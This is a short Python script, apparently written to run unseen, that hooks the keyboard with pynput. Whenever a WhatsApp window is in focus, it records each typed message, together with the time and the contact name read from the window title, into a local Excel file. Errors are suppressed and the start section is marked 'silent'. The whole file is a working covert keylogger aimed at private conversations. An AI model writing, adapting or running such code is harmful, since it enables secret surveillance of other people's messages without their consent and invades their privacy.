import time
from datetime import datetime
from pynput import keyboard
import pygetwindow as gw
from openpyxl import Workbook, load_workbook
import os

ARCHIVO = "wsp_mensajes.xlsx"

KEYWORDS_WSP = ["whatsapp"]

buffer = ""
chat_actual = "Chat_1"
contador_chat = 1

# ========================
# CREAR EXCEL
# ========================
if not os.path.exists(ARCHIVO):
    wb = Workbook()
    ws = wb.active
    ws.append(["Fecha", "Perfil", "Mensaje", "Link"])
    wb.save(ARCHIVO)

# ========================
# DETECTAR PERFIL
# ========================
def obtener_perfil():
    global chat_actual, contador_chat

    try:
        ventana = gw.getActiveWindow()
        if ventana:
            titulo = ventana.title.strip()

            if "-" in titulo:
                perfil = titulo.split("-")[0].strip()

                if perfil.lower() != "whatsapp" and perfil != "":
                    chat_actual = perfil
                    return perfil

            # Si solo dice "WhatsApp"
            return chat_actual

    except:
        pass

    return chat_actual

# ========================
# DETECTAR WHATSAPP
# ========================
def es_whatsapp_activo():
    try:
        ventana = gw.getActiveWindow()
        if ventana:
            titulo = ventana.title.lower()
            return any(k in titulo for k in KEYWORDS_WSP)
    except:
        pass
    return False

# ========================
# GUARDAR
# ========================
def guardar(mensaje):
    try:
        wb = load_workbook(ARCHIVO)
        ws = wb.active

        fecha = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        perfil = obtener_perfil()
        link = "https://web.whatsapp.com/"

        ws.append([fecha, perfil, mensaje, link])
        wb.save(ARCHIVO)

    except PermissionError:
        pass  # silencioso

# ========================
# TECLADO
# ========================
def on_press(key):
    global buffer

    if not es_whatsapp_activo():
        return

    try:
        if key.char:
            buffer += key.char

    except AttributeError:
        if key == keyboard.Key.space:
            buffer += " "

        elif key == keyboard.Key.enter:
            mensaje = buffer.strip()

            if mensaje:
                guardar(mensaje)

            buffer = ""

        elif key == keyboard.Key.backspace:
            buffer = buffer[:-1]

# ========================
# START (SILENCIOSO)
# ========================
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()